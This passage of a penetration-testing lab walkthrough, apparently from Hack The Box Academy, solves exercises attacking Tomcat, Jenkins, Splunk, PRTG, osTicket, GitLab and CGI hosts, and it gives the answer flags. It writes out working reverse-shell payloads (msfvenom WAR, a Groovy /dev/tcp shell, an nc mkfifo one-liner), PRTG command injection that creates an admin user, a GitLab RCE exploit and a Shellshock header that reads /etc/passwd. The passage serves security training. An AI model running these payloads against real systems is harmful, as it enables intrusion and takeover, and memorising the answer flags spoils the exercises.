[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
<SNIP>
[+] 10.129.201.58:8180 - Login Successful: tomcat:root
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The login credentials found are `tomcat:root`.

Answer: `tomcat`

# Attacking Tomcat

## Question 2

### "What is the password?"

From the previous question, students know that the password of the user `tomcat` is `root`.

Answer: `root`

# Attacking Tomcat

## Question 3

### "Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt"

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP web01.inlanefreight.local`

Students then need to generate a `JSP` reverse-shell payload using `msfvenom`:

Code: shell

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f war -o backup.war
```

```shell-session
┌─[us-academy-1]─[10.10.14.6]─[htb-ac413848@htb-f6k4hfqgg8]─[~]
└──╼ [★]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=9001 -f war -o backup.war

Payload size: 1094 bytes
Final size of war file: 1094 bytes
Saved as: backup.war
```

Subsequently, students need to navigate to `http://web01.inlanefreight.local/manager/html` and use the previously harvested credentials `tomcat:root`:

![Attacking_Common_Applications_Walkthrough_Image_25.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_25.png)

Once logged in, students need to scroll down the page until they find "WAR file to upload" and click on "Browse" to upload and then deploy the `msfvenom` generated payload:

![Attacking_Common_Applications_Walkthrough_Image_26.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_26.png)

![Attacking_Common_Applications_Walkthrough_Image_27.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_27.png)

![Attacking_Common_Applications_Walkthrough_Image_28.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_28.png)

Thereafter, students need to start an `nc` listener on Pwnbox/`PMVPN`, specifying the same port used in the generated `msfvenom` payload:

Code: shell

```shell
nc -nvlp PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.6]─[htb-ac413848@htb-f6k4hfqgg8]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Then, students need to click on the recently deployed WAR file so that the reverse-shell session is established:

![Attacking_Common_Applications_Walkthrough_Image_29.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_29.png)

```shell-session
Ncat: Connection from 10.129.201.58.
Ncat: Connection from 10.129.201.58:38618.

whoami

tomcat
```

At last, students need to print out the flag file "tomcat_flag.txt", which is under the directory `/opt/tomcat/apache-tomcat-10.0.10/webapps/`:

```shell-session
cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt

t0mcat_rc3_ftw!
```

Answer: `t0mcat_rc3_ftw!`

# Jenkins - Discovery & Enumeration

## Question 1

### "Log in to the Jenkins instance at http://jenkins.inlanefreight.local:8000. Browse around and submit the version number when you are ready to move on."

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP jenkins.inlanefreight.local`

Students then need to navigate to `http://jenkins.inlanefreight.local:8000` and login with the credentials `admin:admin`:

![Attacking_Common_Applications_Walkthrough_Image_30.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_30.png)

Students will find out the version of `Jenkins` at the right-most bottom, which is `2.303.1` in this case:

![Attacking_Common_Applications_Walkthrough_Image_31.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_31.png)

Answer: `2.303.1`

# Attacking Jenkins

## Question 1

### "Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory"

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP jenkins.inlanefreight.local`

Students then need to navigate to `http://jenkins.inlanefreight.local:8000` and login with the credentials `admin:admin`:

![Attacking_Common_Applications_Walkthrough_Image_30.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_30.png)

Once signed in, students need to click on "Manage Jenkins":

![Attacking_Common_Applications_Walkthrough_Image_32.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_32.png)

Students need to scroll down until they find "Script Console" and click on it:

![Attacking_Common_Applications_Walkthrough_Image_33.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_33.png)

Students then need insert the following `Groovy script` reverse-shell (however, they still should not click on "Run", yet):

Code: groovy

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/PWNIP/PWNPO;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

![Attacking_Common_Applications_Walkthrough_Image_34.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_34.png)

Thereafter, students need to start an `nc` listener on Pwnbox/`PMVPN`, specifying the same port used in the `Groovy script` reverse-shell:

Code: shell

```shell
nc -nvlp PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.6]─[htb-ac413848@htb-f6k4hfqgg8]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Now, students can click on "Run" in the `Jenkins` web page, and the reverse-shell session will be established:

```shell-session
Ncat: Connection from 10.129.201.58.
Ncat: Connection from 10.129.201.58:38942.

whoami

root
```

At last, students can print out the flag file "flag.txt":

Code: shell

```shell
cat flag.txt
```

```shell-session
cat flag.txt

f33ling_gr00000vy!
```

Answer: `f33ling_gr00000vy!`

# Splunk - Discovery & Enumeration

## Question 1

### "Enumerate the Splunk instance as an unauthenticated user. Submit the version number to move on (format 1.2.3)."

After spawning the target machine, students need to launch an `Nmap` scan to enumerate its services and their versions:

Code: shell

```shell
nmap -A -Pn STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.6]─[htb-ac413848@htb-f6k4hfqgg8]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.201.50

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-10 17:57 BST
Nmap scan report for 10.129.201.50
Host is up (0.073s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
<SNIP>
8000/tcp open  ssl/http      Splunkd httpd
|_http-server-header: Splunkd
| ssl-cert: Subject: commonName=APP03/organizationName=SplunkUser
| Not valid before: 2021-08-27T16:52:08
|_Not valid after:  2024-08-26T16:52:08
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was https://10.129.201.50:8000/en-US/account/login?return_to=%2Fen-US%2F
| http-robots.txt: 1 disallowed entry 
|_/
<SNIP>
```

`Splunk` is listening on port 8000, thus, students need to navigate to `https://STMIP:8000` to see that the version listed on the home page title is `8.2.2`:

![Attacking_Common_Applications_Walkthrough_Image_35.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_35.png)

Answer: `8.2.2`

# Attacking Splunk

## Question 1

### "Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\\loot directory."

From the question of the previous section, students know that `Splunk` is listening on port 8000, thus, they need to navigate to `https://STMIP:8000`. Students need to clone the [GitHub repository](https://github.com/0xjpuff/reverse_shell_splunk.git) for the `Splunk` reverse-shell:

Code: shell

```shell
git clone https://github.com/0xjpuff/reverse_shell_splunk.git
```

```shell-session
┌─[us-academy-1]─[10.10.14.6]─[htb-ac413848@htb-f6k4hfqgg8]─[~]
└──╼ [★]$ git clone https://github.com/0xjpuff/reverse_shell_splunk.git

Cloning into 'reverse_shell_splunk'...
remote: Enumerating objects: 23, done.
remote: Total 23 (delta 0), reused 0 (delta 0), pack-reused 23
Receiving objects: 100% (23/23), 5.16 KiB | 5.16 MiB/s, done.
Resolving deltas: 100% (4/4), done.
```

Then, students need to edit the file `run.ps1` under the directory `reverse_shell_splunk/reverse_shell_splunk/bin` to insert `PWNIP` and `PWNPO`, in place of `'attacker_ip_here'` and `attacker_port_here`:

![Attacking_Common_Applications_Walkthrough_Image_36.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_36.png)

After saving the edited file, students need to create a tar ball of the directory so that it can be uploaded to `Splunk`:

Code: shell

```shell
tar -cvzf updater.tar.gz reverse_shell_splunk/
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-7c8tyukmzo]─[~/reverse_shell_splunk]
└──╼ [★]$ tar -cvzf updater.tar.gz reverse_shell_splunk/

reverse_shell_splunk/
reverse_shell_splunk/bin/
reverse_shell_splunk/bin/rev.py
reverse_shell_splunk/bin/run.bat
reverse_shell_splunk/bin/run.ps1
reverse_shell_splunk/default/
reverse_shell_splunk/default/inputs.conf
```

Students then need to start an `nc` listener on Pwnbox/`PMVPN`, specifying the same port used in the `run.ps1` file:

Code: shell

```shell
nc -nvlp PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.6]─[htb-ac413848@htb-f6k4hfqgg8]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Back on the browser page with `https://STMIP:8000` open, students need to click on "Manage Apps":

![Attacking_Common_Applications_Walkthrough_Image_37.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_37.png)

Then, students need to click on "Install app from file" and upload the tar ball file:

![Attacking_Common_Applications_Walkthrough_Image_38.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_38.png)

![Attacking_Common_Applications_Walkthrough_Image_39.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_39.png)

![Attacking_Common_Applications_Walkthrough_Image_40.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_40.png)

After uploading the tar ball file successfully, students will notice the reverse-shell session has been established:

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-7c8tyukmzo]─[~/reverse_shell_splunk]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.201.50.
Ncat: Connection from 10.129.201.50:52334.

whoami

nt authority\system
PS C:\Windows\system32>
```

At last, students need to print out the flag file "flag.txt" under the `C:\loot\` directory:

Code: powershell

```powershell
cat C:\loot\flag.txt
```

```powershell-session
PS C:\Windows\system32> cat C:\loot\flag.txt

l00k_ma_no_AutH!
```

Answer: `l00k_ma_no_AutH!`

# PRTG Network Monitor

## Question 1

### "What version of PRTG is running on the target?"

After spawning the target machine, students need to launch an `Nmap` scan to enumerate its services and their versions:

Code: shell

```shell
nmap -A -Pn STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.6]─[htb-ac413848@htb-f6k4hfqgg8]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.201.50

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-10 17:57 BST
Nmap scan report for 10.129.201.50
Host is up (0.073s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
<SNIP>
8080/tcp open  http          Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (APP03)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-open-proxy: Proxy might be redirecting requests

<SNIP>
```

`PRTG` is running on port 8080, thus, students need to navigate to `https://STMIP:8080` to see its version `18.1.37.13946` at the bottom left of the web page:

![Attacking_Common_Applications_Walkthrough_Image_41.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_41.png)

Answer: `18.1.37.13946`

# PRTG Network Monitor

## Question 2

### "Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop."

From the previous question, students know that `PRTG` is running on port 8080, therefore, they need to navigate to `https://STMIP:8080` and login using the credentials `prtgadmin:Password123`:

![Attacking_Common_Applications_Walkthrough_Image_42.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_42.png)

Students then need to hover the click on `Setup` -> `Account Settings` -> `Notifications`:

![Attacking_Common_Applications_Walkthrough_Image_43.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_43.png)

Then, students need to click on "Add new notification" and name the notification with any name:

![Attacking_Common_Applications_Walkthrough_Image_44.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_44.png)

Students then need to scroll down until they see the "Execute Program" option and check it:

![Attacking_Common_Applications_Walkthrough_Image_45.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_45.png)

Students need to set the "Program File" field to "Demo exe notification - outfile.ps1" and set the "Parameter" field to a command that will create a user on the Windows system running `PRTG` and add it to the local administrators group:

Code: powershell

```powershell
test.txt; net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

![Attacking_Common_Applications_Walkthrough_Image_46.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_46.png)

After students save the new notification, they need to select it (named "Outage Notification" in here) when in the "Notifications" tab, and at the right most corner of the screen will appear a vertical bar, students need to click on the bell icon to run a test notification (therefore, executing the command used in the "Parameter" field of the notification):

![Attacking_Common_Applications_Walkthrough_Image_47.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_47.png)

![Attacking_Common_Applications_Walkthrough_Image_48.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_48.png)

Afterward, students can check for whether the user `prtgadm1` has been successfully created on the Windows machine using `crackmapexec`:

Code: shell

```shell
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-6la7uwnoyb]─[~]
└──╼ [★]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!

<SNIP>
SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 x64 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

Now that students are assured the user has been added successfully, they need to connect to the spawned target machine, such as with `Evil-WinRM`:

Code: shell

```shell
evil-winrm -i STMIP -u prtgadm1 -p 'Pwn3d_by_PRTG!'
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-6la7uwnoyb]─[~]
└──╼ [★]$ evil-winrm -i 10.129.201.50 -u prtgadm1 -p 'Pwn3d_by_PRTG!'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\prtgadm1\Documents>
```

At last, students need to print out the contents of the flag file "flag.txt", which is inside the directory `C:\Users\Administrator\Desktop\`:

Code: shell

```shell
type C:\Users\Administrator\Desktop\flag.txt
```

```shell-session
*Evil-WinRM* PS C:\Users\prtgadm1\Documents> type C:\Users\Administrator\Desktop\flag.txt

WhOs3_m0nit0ring_wH0?
```

Answer: `WhOs3_m0nit0ring_wH0?`

# osTicket

## Question 1

### "Find your way into the osTicket instance and submit the password sent from the Customer Support Agent to the customer Charles Smithson."

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP support.inlanefreight.local`

Subsequently, using a browser, students need to navigate to `http://support.inlanefreight.local/scp/login.php`. From the module section's reading, students need to login using the credentials `kevin@inlanefreight.local:Fish1ng_s3ason!`:

![Attacking_Common_Applications_Walkthrough_Image_49.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_49.png)

![Attacking_Common_Applications_Walkthrough_Image_50.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_50.png)

Once logged in, students need to click on "Closed" and then navigate to the only closed ticket available:

![Attacking_Common_Applications_Walkthrough_Image_51.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_51.png)

Students will find the password sent from the Customer Support Agent to the customer Charles Smithson `Inlane_welcome!` in the thread posted on 9/23/21 7:55 PM:

![Attacking_Common_Applications_Walkthrough_Image_52.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_52.png)

Answer: `Inlane_welcome!`

# GitLab - Discovery & Enumeration

## Question 1

### "Enumerate the GitLab instance at http://gitlab.inlanefreight.local. What is the version number?"

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP gitlab.inlanefreight.local`

Using a browser, students then need to navigate to `http://gitlab.inlanefreight.local` and click on `Register now`:

![Attacking_Common_Applications_Walkthrough_Image_53.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_53.png)

Students need to fill in dummy data and then click "Register":

![Attacking_Common_Applications_Walkthrough_Image_54.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_54.png)

![Attacking_Common_Applications_Walkthrough_Image_55.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_55.png)

Once logged in, students need to navigate to the `/help` directory to find the version number `13.10.2` at the top of the page:

![Attacking_Common_Applications_Walkthrough_Image_56.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_56.png)

Answer: `13.10.2`

# GitLab - Discovery & Enumeration

## Question 2

### "Find the PostgreSQL database password in the example project."

Using the same GitLab account that students have created and logged in to in the previous question, students need to click on `Projects` -> `Explore projects`:

![Attacking_Common_Applications_Walkthrough_Image_57.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_57.png)

Then, students need to open the "Inlanefreight dev" project:

![Attacking_Common_Applications_Walkthrough_Image_58.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_58.png)

Subsequently, students need to open the "phpunit_pgsql.xml" file:

![Attacking_Common_Applications_Walkthrough_Image_59.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_59.png)

Within the file, students will find the password of the PostgreSQL database to be `postgres`:

![Attacking_Common_Applications_Walkthrough_Image_60.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_60.png)

Answer: `postgres`

# Attacking GitLab

## Question 1

### "Find another valid user on the target GitLab instance."

After spawning the target machine, students need to make sure that the following vHost entry is present in `/etc/hosts`:

- `STMIP gitlab.inlanefreight.local`

Then, using `searchsploit`, students need to download the [GitLab Community Edition User Enumeration script](https://www.exploit-db.com/exploits/49821) on Pwnbox/`PMVPN`:

Code: shell

```shell
searchsploit -m ruby/webapps/49821.sh
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-xk6dxgmeci]─[~]
└──╼ [★]$ searchsploit -m ruby/webapps/49821.sh

  Exploit: GitLab Community Edition (CE) 13.10.3 - User Enumeration
      URL: https://www.exploit-db.com/exploits/49821
     Path: /usr/share/exploitdb/exploits/ruby/webapps/49821.sh
File Type: ASCII text

Copied to: /home/htb-ac413848/49821.sh
```

Students need to use the script to enumerate valid users:

Code: shell

```shell
./49821.sh --url http://gitlab.inlanefreight.local:8081 --userlist /opt/useful/seclists/Usernames/cirt-default-usernames.txt | grep exists
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-xk6dxgmeci]─[~]
└──╼ [★]$ ./49821.sh --url http://gitlab.inlanefreight.local:8081 --userlist /opt/useful/seclists/Usernames/cirt-default-usernames.txt | grep exists

[+] The username DEMO exists!
```

The other valid user is `DEMO`.

Answer: `DEMO`

# Attacking GitLab

## Question 2

### "Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in."

Building on the previous question and the `GitLab` user created in the previous section, students first need to download the [Gitlab 13.10.2 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/49951) exploit using `searchsploit`:

Code: shell

```shell
searchsploit -m ruby/webapps/49951.py
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-xk6dxgmeci]─[~]
└──╼ [★]$ searchsploit -m ruby/webapps/49951.py

  Exploit: Gitlab 13.10.2 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/49951
     Path: /usr/share/exploitdb/exploits/ruby/webapps/49951.py
File Type: Python script, ASCII text executable

Copied to: /home/htb-ac413848/49951.py
```

Then, on Pwnbox/`PMVPN`, students need to start an `nc` listener:

Code: shell

```shell
nc -nvlp 9001
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-xk6dxgmeci]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

From the previous section, students should have already created a `GitLab` user (with the credentials `HTBAcademy:password123` in here), therefore, they need to utilize it to attain a reverse-shell with the exploit:

Code: shell

```shell
python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u HTBAcademy -p password123 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc PWNIP PWNPO >/tmp/f'
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-xk6dxgmeci]─[~]
└──╼ [★]$ python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u HTBAcademy -p password123 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.169 9001 >/tmp/f'

[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```

On the `nc` listener, students will notice that the reverse-shell connection has been established. Thus, at last, they need to print the flag file "flag_gitlab.txt":

Code: shell

```shell
cat flag_gitlab.txt
```

```shell-session
Ncat: Connection from 10.129.106.176.
Ncat: Connection from 10.129.106.176:57096.
bash: cannot set terminal process group (1289): Inappropriate ioctl for device
bash: no job control in this shell

git@app04:~/gitlab-workhorse$ cat flag_gitlab.txt

s3cure_y0ur_Rep0s!
```

Answer: `s3cure_y0ur_Rep0s!`

# Attacking Tomcat CGI

## Question 1

### "After running the URL Encoded 'whoami' payload, what user is tomcat running as?"

After spawning the target machine, students first need to use `Nmap` to confirm the target is running Tomcat:

Code: shell

```shell
nmap -p- -sC -Pn STMIP --open 
```

```shell-session
┌─[us-academy-2]─[10.10.15.12]─[htb-ac-594497@htb-geylz278ib]─[~]
└──╼ [★]$ nmap -p- -sC -Pn 10.129.205.30 --open

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-30 15:22 BST
Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 69.35% done; ETC: 15:23 (0:00:23 remaining)
Nmap scan report for 10.129.205.30
Host is up (0.036s latency).
Not shown: 59487 closed tcp ports (conn-refused), 6035 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   2048 ae:19:ae:07:ef:79:b7:90:5f:1a:7b:8d:42:d5:60:99 (RSA)
|   256 38:2e:76:cd:05:94:a6:e7:17:d1:80:81:65:26:25:44 (ECDSA)
|_  256 35:09:69:12:23:0f:11:bc:54:6f:dd:f7:97:bd:61:50 (ED25519)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8009/tcp  open  ajp13
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Host script results:
| smb2-time: 
|   date: 2023-03-30T14:23:37
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 164.63 seconds
```

Confirming that the target is indeed running Tomcat on port 8080, students need to fuzz for CGI scripts using `ffuf`, finding `welcome.bat`:

Code: shell

```shell
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://STMIP:8080/cgi/FUZZ.bat
```

```shell-session
┌─[us-academy-2]─[10.10.15.12]─[htb-ac-594497@htb-geylz278ib]─[~]
└──╼ [★]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.bat

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.205.30:8080/cgi/FUZZ.bat
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

welcome                 [Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 99ms]
:: Progress: [4614/4614] :: Job [1/1] :: 3145 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

Students need use `welcome.bat` to run `whoami` from `c:\windows\system32\whoami.exe`, making sure to URL-encode it before sending it. Students will find that the tomcat user is running as `feldspar\omen`:

Code: shell

```shell
curl 'http://STMIP:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe'
```

```shell-session
┌─[us-academy-2]─[10.10.15.12]─[htb-ac-594497@htb-geylz278ib]─[~]
└──╼ [★]$ curl 'http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe'

Welcome to CGI, this section is not functional yet. Please return to home page.
feldspar\omen
```

Answer: `feldspar\omen`

# Attacking Common Gateway Interface (CGI) Applications - Shellshock

## Question 1

### "Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server."

After spawning the target machine, students need to first fuzz for CGI scripts hosted on the target, finding `access.cgi`:

Code: shell

```shell
gobuster dir -u http://STMIP/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

```shell-session
┌─[us-academy-2]─[10.10.15.12]─[htb-ac-594497@htb-geylz278ib]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.205.27/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              cgi
[+] Timeout:                 10s
===============================================================
2023/03/30 15:43:57 Starting gobuster in directory enumeration mode
===============================================================
/access.cgi           (Status: 200) [Size: 0]
                                             
===============================================================
2023/03/30 15:44:00 Finished
===============================================================
```

Students then need to test if the endpoint suffers from Shellshock via `access.cgi`, finding it to be vulnerable:

Code: shell

```shell
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://STMIP/cgi-bin/access.cgi
```

```shell-session
┌─[us-academy-2]─[10.10.15.12]─[htb-ac-594497@htb-geylz278ib]─[~]
└──╼ [★]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
